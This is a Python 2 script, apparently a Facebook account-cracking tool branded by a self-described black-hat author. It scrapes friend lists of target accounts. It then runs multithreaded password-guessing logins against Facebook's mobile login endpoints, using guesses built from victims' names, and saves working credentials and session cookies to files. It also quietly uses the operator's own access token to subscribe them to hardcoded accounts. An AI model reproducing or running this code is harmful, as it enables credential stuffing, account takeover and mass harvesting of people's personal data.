#!/usr/bin/python
# -*- coding: utf-8

# Mr.James

import requests, bs4, sys, os, subprocess, requests, sys, random, time, re, base64, json, getpass
reload(sys)
sys.setdefaultencoding('utf-8')
from multiprocessing.pool import ThreadPool
if 'linux' in sys.platform.lower():
    N = '\x1b[0m'
    G = '\x1b[1;92m'
    O = '\x1b[1;97m'
    R = '\x1b[1;91m'
else:
    N = ''
    G = ''
    O = ''
    R = ''

def banner():
    print """
\033[1;92m    _          _
\033[1;92m     \        /
\033[1;92m    __\______/__
\033[1;92m    | [\033[1;31;1m©\033[1;92m]  [\033[1;31;1m©\033[1;92m] |​
 \033[1;92m   |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+]
\033[1;92m╔══o00════════00o═════════════════════════╗
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m█
\033[1;92m╚═════════════════════════════════════════╝
\033[1;93m➣ HACKING IS NOT CRIME IT’S A GAME AGAINST OF THE SYSTEM 
\033[1;93m➣ BANGLADESH BLACK HAT HACKER
\033[1;31;1m➣     AUTHOR :\033[1;92m JAMES-HACKER
\033[1;31;1m➣       FROM :\033[1;92m DHAKA,NARAYANGANJ 
\033[1;31;1m➣    WARNING :\033[1;92m DON'T COPY MY SCRIPT
\033[1;31;1m➣    WARNING :\033[1;92m IF YOU GET TO FACE PROBLEM CLONING TIME
\033[1;31;1m➣    WARNING :\033[1;92m CONTACT MY FB GROUP OR PAGE  """ 


host = 'https://mbasic.facebook.com'
ua = open('User-Agent.txt', 'r').read()
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
my_color = [
 P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)
m = '\x1b[1;91m'
u = '\x1b[1;95m'
h = '\x1b[1;92m'
p = '\x1b[1;37m'
k = '\x1b[1;33m'
b = '\x1b[1;34m'
bm = '\x1b[96m'
ips = None
try:
    b = requests.get('https://api.ipify.org').text.strip()
    ips = requests.get('https://ipapi.com/ip_api.php?ip=' + b, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].lower()
except:
    ips = None

uas = None
if os.path.exists('.browser'):
    if os.path.getsize('.browser') != 0:
        uas = open('.browser').read().strip()
touch_fbh = {'Host': 'touch.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': uas, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
m_fbh = {'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': uas, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
mbasic_h = {'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': uas, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
graph_h = {'Host': 'graph.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': uas, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}

def clear():
    if ' linux' in sys.platform.lower():
        os.system('clear')
    elif 'win' in sys.platform.lower():
        os.system('cls')
    else:
        os.system('clear')


def jalan(z, t):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(t)


def load(word):
    lix = ['/', '-', '\xe2\x95\xb2', '|']
    for i in range(5):
        for x in range(len(lix)):
            sys.stdout.write(('\r{}{}').format(str(word), lix[x]))
            time.sleep(0.2)
            sys.stdout.flush()


def chat():
    load('Please wait a moment---')
    os.system('xdg-open https://bit.ly/3whqL7o')


kunci = ('\n \t{} \n ░░░░░██╗░█████╗░███╗░░░███╗███████╗░██████\n ░░░░░██║██╔══██╗████╗░████║██╔════╝██╔════╝\n ░░░░░██║███████║██╔████╔██║█████╗░░╚█████╗░\n ██╗░░██║██╔══██║██║╚██╔╝██║██╔══╝░░░╚═══██╗\n ╚█████╔╝██║░░██║██║░╚═╝░██║███████╗██████╔╝ \n ░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚══════╝╚═════╝░      ').format(m)

def lisensi_enc():
    os.system('clear')
    print kunci
    print ('{}[{}!{}] {}Hey Bro, This Tool Password Protect.').format(m, p, m, p)
    paswd = getpass.getpass(('{}[{}\xc3\x97{}]{} Enter Password {}>> {}').format(m, p, m, p, k, p))
    if paswd == 'Abcdefghijklmnopqrstuvwxyz':
        jalan('Yes Bro You Put Correct Password \xe2\x9c\x93 ', 0.1)
        time.sleep(2)
        menu()
    elif paswd == '':
        run('Please enter password !!')
        time.sleep(1.5)
        lisensi_enc()
    else:
        jalan('wrong password!!', 0.1)
        chat()


def lang(cookies):
    f = False
    rr = bs4.BeautifulSoup(requests.get('https://mbasic.facebook.com/language.php', headers=hdcok(), cookies=cookies).text, 'html.parser')
    for i in rr.find_all('a', href=True):
        if 'id_ID' in i.get('href'):
            requests.get('https://mbasic.facebook.com/' + i.get('href'), cookies=cookies, headers=hdcok())
            b = requests.get('https://mbasic.facebook.com/profile.php', headers=hdcok(), cookies=cookies).text
            if 'apa yang anda pikirkan sekarang' in b.lower():
                f = True

    if f == True:
        return True
    exit(' [!]Cookies Die.').format(R, N)


def basecookie():
    if os.path.exists('.cok'):
        if os.path.getsize('.cok') != 0:
            return gets_dict_cookies(open('.cok').read().strip())
        logs()
    else:
        logs()


def hdcok():
    global host
    global ua
    hosts = host
    r = {'origin': hosts, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', hosts)), 'referer': hosts + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}
    return r


def gets_cookies(cookies):
    result = []
    for i in enumerate(cookies.keys()):
        if i[0] == len(cookies.keys()) - 1:
            result.append(i[1] + '=' + cookies[i[1]])
        else:
            result.append(i[1] + '=' + cookies[i[1]] + '; ')

    return ('').join(result)


def gets_dict_cookies(cookies):
    result = {}
    try:
        for i in cookies.split(';'):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result
    except:
        for i in cookies.split('; '):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result


def gen():
    ck = raw_input(' [+] Enter Cookie : ')
    if ck == '':
        gen()
    try:
        cks = gets_dict_cookies(ck)
        if lang(cks) == True:
            open('.cok', 'w').write(ck)
            convert()
            print (' [!] Login Success').format(G, N)
            time.sleep(1)
            menu()
        else:
            print (' [!] Invalid Cookie').format(R, N)
            gen()
    except Exception as e:
        print ' [!] Error : %s' % e
        gen()
        logs()


def log_token():
    data = raw_input(' [+] Enter Token :')
    try:
        me = requests.get('https://graph.facebook.com/me?access_token=' + data)
        a = json.loads(me.text)
        nama = a['name']
        open('login.txt', 'w').write(data)
        print (' [!] Login Success').format(G, N)
        bot_komen()
        menu()
    except KeyError:
        print (' [!] Invalid Token').format(R, N)
        time.sleep(1.0)
        logs()


def convert():
    try:
        tomken = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': open('.cok', 'r').read()})
        find_token = re.search('(EAAA\\w+)', tomken.text)
        if find_token is None:
            pass
        else:
            open('login.txt', 'w').write(find_token.group(1))
            return
    except Exception as e:
        print R + '\n [!] Error : %s' % e
        exit()

    return


def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ' [!] Token invalid'
        logs()

    requests.post('https://graph.facebook.com/100009259963367/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100007018489471/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100002758020692/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100008409870034/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100043153606887/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100045203855294/subscribers?access_token=' + toket)
    menu()


def menu():
    try:
        toket = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
        bh = requests.get('https://api.ipify.org').text.strip()
    except Exception as e:
        print (' [!] Error : %s' % e).format(R, N)
        time.sleep(1)
        logs()

    os.system('clear')
    banner()
    print 55 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[0;96m\t[\xe2\x88\x9a] Welcome : \x1b[1;97m' + nama
    print '\x1b[0;96m\t[\xe2\x88\x9a] Your IP    : \x1b[1;97m' + bh
    print '\x1b[0;96m\t[\xe2\x88\x9a] License : \x1b[1;97mMrJames-Black404-Bangladesh'
    print 55 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[0;92m\t       [Cracking Manu]'
    print '\x1b[0;96m'
    print '\x1b[0;97m[' + warni + '01\x1b[1;97m]' + warna + ' Dump Slow Mode'
    print '\x1b[0;97m[' + warni + '02\x1b[1;97m]' + warna + ' Dump Fast Mode'
    print '\x1b[0;97m[' + warni + '03\x1b[1;97m]' + warna + ' Start Crack'
    print '\x1b[0;97m[' + warni + '04\x1b[1;97m]' + warna + ' Detele Fast.json'
    print '\x1b[1;97m[' + warni + '05\x1b[1;97m]' + warna + ' Change User-Agent'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]' + warna + ' Exit'
    print 55 * '\x1b[1;94m\xe2\x94\x80'
    r = raw_input('\x1b[0;97m [\xc2\xbb] : ')
    if r == '':
        print ('\x1b[0;97m [!] Fill in the Correct').format(R, N)
        menu()
    elif r == '1':
        publik()
    elif r == '2':
        idfrom_teman()
    elif r == '3':
        crack()
        exit()
    elif r == '4':
        os.system('rm -rf fast.json')
        jalan('[!] Deleting Files ...', 0.1)
        time.sleep(0.1)
        jalan('\n[\xe2\x88\x9a] File Has Been Deleted ...', 0.1)
        menu()
    elif r == '5':
        ubahagent()
        menu()
    elif r == '0':
        try:
            os.remove('login.txt')
            exit(basecookie())
        except Exception as e:
            print '\x1b[0;97m   [!] Error File Not Found %s' % e

    else:
        print (' [!] Incorrect input').format(R, N)
        menu()


def ubahagent():
    os.system('clear')
    banner()
    print 55 * '\x1b[1;94m\xe2\x94\x80'
    ubaa = raw_input('\x1b[1;96m             [+] Enter User Agent [+]\x1b[1;94m\n\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;95m\n')
    print 55 * '\x1b[1;94m\xe2\x94\x80'
    try:
        zedd = open('User-Agent.txt', 'w')
        zedd.write(ubaa)
        zedd.close()
        print '\x1b[1;96m      [\xe2\x88\x9a] User Agent Changed Successfully...! '
        print 55 * '\x1b[1;94m\xe2\x94\x80'
        time.sleep(1)
        menu()
    except KeyError:
        print '\x1b[1;91m[!] Wrong User Agent !'
        time.sleep(1.7)
        ubahagent()


def publik():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print (' [!] Cookie Invalid').format(R, N)
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        gen()

    try:
        os.system('clear')
        banner()
        print 55 * '\x1b[1;94m\xe2\x94\x80'
        print "\x1b[0;96m[+] Type 'me' if you want to retrieve ID from friends list"
        idt = raw_input('\x1b[0;96m[+] Enter Id : ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[0;96m[\xe2\x88\x9a] Name           : ' + op['name']
        except KeyError:
            print (' [!] ID NOT found !').format('R')
            print (' [!] Back').format(N)
            publik()

        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(50000)&access_token=' + toket)
        id = []
        z = json.loads(r.text)
        print '\x1b[0;96[!] Getting ID ...'
        print 55 * '\x1b[1;94m\xe2\x94\x80'
        qq = (op['first_name'] + '.json').replace(' ', '_')
        ys = open(qq, 'w')
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')
            print warni + '\r  [%s] ' % str(len(id)),
            sys.stdout.flush()
            time.sleep(0.1)
            print warna + a['name']

        ys.close()
        print 55 * '\x1b[1;94m\xe2\x94\x80'
        print '\x1b[0;96m[\xe2\x88\x9a] Successfully Fetched ID From %s' % op['name']
        print '\x1b[0;96m[!] Total ID : %s' % len(id)
        print '\x1b[0;96m[!] Output : %s' % qq
        print 55 * '\x1b[1;94m\xe2\x94\x80'
        raw_input('\x1b[0;97m [\xc2\xab] [Back]')
        menu()
    except Exception as e:
        exit('   [!] Error : %s' % e)


idfromteman = []

def idfrom_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;91m [!] Cookie Invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        gen()

    try:
        os.system('clear')
        banner()
        print 55 * '\x1b[1;94m\xe2\x94\x80'
        print "\x1b[0;96m[+] Type 'me' if you want to retrieve ID from friends list"
        idt = raw_input('\x1b[0;96m[+] User ID Target : ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[0;96m[\xe2\x88\x9a] Name           : ' + op['name']
        except KeyError:
            print (' [!] ID NOT found !').format('R')
            raw_input(' [!] Back').format(N)
            idfrom_teman()

        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(50000)&access_token=' + toket)
        z = json.loads(r.text)
        print '\x1b[0;96[!] Getting ID ...'
        print 55 * '\x1b[1;94m\xe2\x94\x80'
        bz = open('fast.json', 'a')
        for a in z['friends']['data']:
            idfromteman.append(a['id'])
            bz.write(a['id'] + '<=>' + a['name'] + '\n')

        bz.close()
        print '\x1b[0;96m[\xe2\x88\x9a] Successfully Fetched ID From %s' % op['name']
        print '\r\x1b[0;96m[\x1b[1;96m!\x1b[0;96m] Total ID : %s' % len(idfromteman)
        print '\x1b[0;96m[!] Output : \x1b[1;92mfast.json'
        print 55 * '\x1b[1;94m\xe2\x94\x80'
        print '\n\x1b[0;93mYou Can Multiply Dump Result Targets \n\tWith Other Dump Targets \n'
        dump_lagi()
    except OSError:
        print '\x1b[0;97m [!] Unsaved File '
        raw_input(' [!] Back').format(N)
        idfrom_teman()
    except IOError:
        print '\x1b[0;97m[!] Error creating file'
        raw_input(' [!] Back').format(N)
        idfrom_teman()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[0;97m [!] Stop'
        raw_input(' [!] Back').format(N)
        menu()
    except KeyError:
        print '\x1b[0;97m [!] Friend No.!'
        raw_input(' [!] Back').format(N)
        idfrom_teman()
    except requests.exceptions.ConnectionError:
        print '\x1b[0;97m[\x1b[0;91m\xe2\x9c\x96\x1b[0;97m] No Connection.!'
        exit()


def dump_lagi():
    cuit = raw_input('[\xc2\xab\xc2\xbb] Input y/n : ')
    if cuit == '':
        print '  [!] Choose the Correct'
        dump_lagi()
    elif cuit == 'y' or cuit == 'yes':
        idfrom_teman()
    elif cuit == 'n' or cuit == 'no':
        menu()
    elif cuit == '0' or cuit == '00':
        exit()
    else:
        print '  [!] Incorrect Input'
        dump_lagi()


def mbasic(em, pas, hosts):
    global mbasic_h
    r = requests.Session()
    r.headers.update(mbasic_h)
    p = r.get('https://mbasic.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return


def m_fb(em, pas, hosts):
    global m_fbh
    r = requests.Session()
    r.headers.update(m_fbh)
    p = r.get('https://m.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return


def touch_fb(em, pas, hosts):
    global touch_fbh
    r = requests.Session()
    r.headers.update(touch_fbh)
    p = r.get('https://touch.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://touch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return


def graph_fb(em, pas, hosts):
    r = requests.Session()
    r.headers.update(mbasic_h)
    p = r.get('https://mbasic.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return


def generate(text):
    global ips
    results = []
    for i in text.split(' '):
        if len(i) < 3:
            continue
        else:
            i = i.lower()
            if len(i) == 3 or len(i) == 4 or len(i) == 5:
                results.append(i + '123')
                results.append(i + '12345')
            else:
                results.append(i + '123')
                results.append(i + '1234')
                results.append(i + '12345')
                results.append(i)
                if 'pakistan' in ips:
                    results.append('786786')
                    results.append('445566')
                    results.append('Pakistan123')
                    results.append('102030')

    return results


def methode():
    os.system('clear')
    banner()
    print 55 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[0;92m[Method Manu]'
    print '\x1b[0;96m'
    print '\x1b[0;97m{' + warni + '01\x1b[1;97m}' + warna + ' Crack With mbasic'
    print '\x1b[0;97m{' + warni + '02\x1b[1;97m}' + warna + ' Crack With m.facebook.com'
    print '\x1b[0;97m{' + warni + '03\x1b[1;97m}' + warna + ' Crack With touch.facebook.com'
    print '\x1b[0;97m{' + warni + '04\x1b[1;97m}' + warna + ' Crack With api'
    print 55 * '\x1b[1;94m\xe2\x94\x80'
    sek = raw_input('\x1b[0;97m [\xc2\xbb] : ')
    if sek == '':
        print ('\x1b[0;97m [!] Fill in the Correct').format(R, N)
        methode()
    elif sek == '1':
        crack()
    elif sek == '2':
        crack1()
    elif sek == '3':
        crack2()
    elif sek == '4':
        crack3()
    else:
        print ('\x1b[0;97m [!] Incorrect input').format(R, N)
        methode()


def logs():
    os.system('clear')
    banner()
    print 55 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[0;92m\t [Login Manu]'
    print '\x1b[0;96m'
    print '\x1b[0;97m{' + warni + '01\x1b[1;97m}' + warna + ' Login With Token'
    print '\x1b[0;97m{' + warni + '02\x1b[1;97m}' + warna + ' Login With Cookie'
    print '\x1b[0;97m{' + warni + '00\x1b[1;97m}' + warna + ' Exit'
    print 55 * '\x1b[1;94m\xe2\x94\x80'
    sek = raw_input('\x1b[0;96m [\xc2\xbb] : ')
    if sek == '':
        print ('\x1b[0;97m   [!] Fill in the Correct').format(R, N)
        logs()
    elif sek == '1':
        log_token()
    elif sek == '2':
        gen()
    elif sek == '0':
        exit()
    else:
        print ('\x1b[0;97m   [!] Fill in the Correct').format(R, N)
        logs()


class crack:
    os.system('clear')
    banner()

    def __init__(self):
        self.ada = []
        self.cp = []
        self.ko = 0
        os.system('clear')
        banner()
        print 55 * '\x1b[1;94m\xe2\x94\x80'
        print '\x1b[0;97m{' + warni + '01\x1b[1;97m}' + warna + ' Crack Fast Mode '
        print '\x1b[0;97m{' + warni + '02\x1b[1;97m}' + warna + ' Crack Slow Mode '
        print 55 * '\x1b[1;94m\xe2\x94\x80'
        while True:
            f = raw_input('\x1b[0;96m[\xc2\xbb] : ')
            if f == '':
                continue
            elif f == '1':
                try:
                    while True:
                        try:
                            os.system('clear')
                            banner()
                            print 55 * '\x1b[1;94m\xe2\x94\x80'
                            print '                    CRACK FAST MODE '
                            print 55 * '\x1b[1;94m\xe2\x94\x80'
                            self.apk = raw_input('\x1b[0;96m[+] File : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e
                    continue

                self.pwlist()
                break
            elif f == '2':
                try:
                    while True:
                        try:
                            os.system('clear')
                            banner()
                            print 55 * '\x1b[1;94m\xe2\x94\x80'
                            print '                    CRACK SLOW MODE '
                            print 55 * '\x1b[1;94m\xe2\x94\x80'
                            self.apk = raw_input('\x1b[0;96m[+] Enter File : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e
                    continue

                print 55 * '\x1b[1;94m\xe2\x94\x80'
                print '\x1b[0;96m[\xe2\x88\x9a] Crack Started...'
                print '\x1b[1;92mOK : ok.txt   \x1b[1;97m|   \x1b[1;93mCP : cp.txt'
                print 55 * '\x1b[1;94m\xe2\x94\x80'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print ' [\xe2\x88\x9a] Finished'
                break

    def pwlist(self):
        self.pw = raw_input('\x1b[0;96m[+] Password List : ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print 55 * '\x1b[1;94m\xe2\x94\x80'
            print '\x1b[0;96m[\xe2\x88\x9a] Cracking Running...'
            print '\x1b[1;92mOK : ok.txt   \x1b[1;97m|   \x1b[1;93mCP : cp.txt'
            print 55 * '\x1b[1;94m\xe2\x94\x80'
            ThreadPool(30).map(self.main, self.fl)
            print ' [\xe2\x88\x9a] Finished'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = mbasic(fl.get('id'), i, 'https://mbasic.facebook.com')
                if log.get('status') == 'success':
                    print '\r\x1b[1;92m [JAMES-HACKED 💉]%s %s \xe2\x80\xa2 %s %s      ' % (G, fl.get('id'), i, N)
                    self.ada.append('%s|%s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('ok.txt', 'a+').write('%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies'))))
                    ko = '%s|%s|%s\n\n' % (fl.get('id'), i, gets_cookies(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print '\r\x1b[1;93m [JAMES-CP] %s \xe2\x80\xa2 %s %s      ' % (fl.get('id'), i, N)
                    self.cp.append('%s|%s' % (fl.get('id'), i))
                    open('cp.txt', 'a+').write('%s|%s|\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r\x1b[1;91m [%s/%s]  \x1b[0m[\x1b[1;92m%s\x1b[1;93m/%s\x1b[0m]' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)


if __name__ == '__main__':
    lisensi_enc()
